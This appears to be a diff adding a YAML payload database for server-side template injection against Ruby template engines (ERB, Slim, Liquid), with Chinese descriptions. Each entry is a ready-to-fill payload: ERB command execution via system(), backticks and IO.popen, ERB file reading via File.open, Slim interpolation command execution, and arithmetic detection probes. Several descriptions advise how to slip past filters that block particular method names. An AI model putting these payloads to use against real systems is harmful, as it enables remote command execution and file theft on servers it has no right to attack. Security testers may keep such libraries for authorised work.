@@ -1,0 +1,108 @@
+ruleDB: v0.1.0
+# Ruby 系：ERB、Slim。定界符 <%%> 与 #{}。
+
+templates:
+  - id: ssti.ruby.erb.rce.system
+    name: ERB system 命令执行
+    desc: Rails / ERB 目标上最直接的一条，<%= %> 里的代码真被求值就行。system 被过滤时换反引号那条，命令输出一样回显
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [rails, erb]
+    version: "*"
+    body: "<%= system(\"<<cmd>>\") %>"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.ruby.erb.rce.backtick
+    name: ERB 反引号命令执行
+    desc: system 被过滤时用反引号，返回值直接回显
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [rails, erb]
+    version: "*"
+    body: "<%= `<<cmd>>` %>"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.ruby.erb.file.read
+    name: ERB 读文件
+    desc: Rails / ERB 目标上只读文件时用它，路径直接给绝对路径。求值条件跟 ERB 命令执行那两条一样，<%= %> 不求值就都不成立
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [rails, erb]
+    version: "*"
+    body: "<%= File.open(\"<<filepath>>\").read %>"
+    vars: [filepath]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.ruby.slim.detect
+    name: Slim 插值探测
+    desc: "Slim 用 #{} 插值，算术求值说明存在模板注入"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [slim, rails]
+    version: "*"
+    body: "#{7*7}"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.ruby.liquid.detect
+    name: Liquid 过滤器探测
+    desc: Liquid 的 {{ }} 不做算术，但**过滤器**能算。加上 plus 输出 14 说明是 Liquid
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [liquid, shopify]
+    version: "*"
+    body: "{{7 | plus: 7}}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.ruby.slim.rce
+    name: Slim 插值命令执行
+    desc: "Slim 的 #{} 就是 Ruby 字符串插值，反引号里是可执行的命令"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [slim, rails]
+    version: "*"
+    body: "#{`<<cmd>>`}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.ruby.erb.rce.io_popen
+    name: ERB 经 IO.popen 命令执行
+    desc: "`system` 和反引号都被过滤时用——`IO.popen` 是第三条独立路径，它既不经过 `Kernel#system` 也不经过反引号那个方法，所以按方法名拉黑名单的规则容易漏掉它。`readlines.join` 把逐行输出拼回一个字符串直接回显，不依赖输出层帮你拼接"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [rails, erb]
+    version: "*"
+    body: '<%= IO.popen("<<cmd>>").readlines.join %>'
+    vars: [cmd]
+    requires: [template-ctrl, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
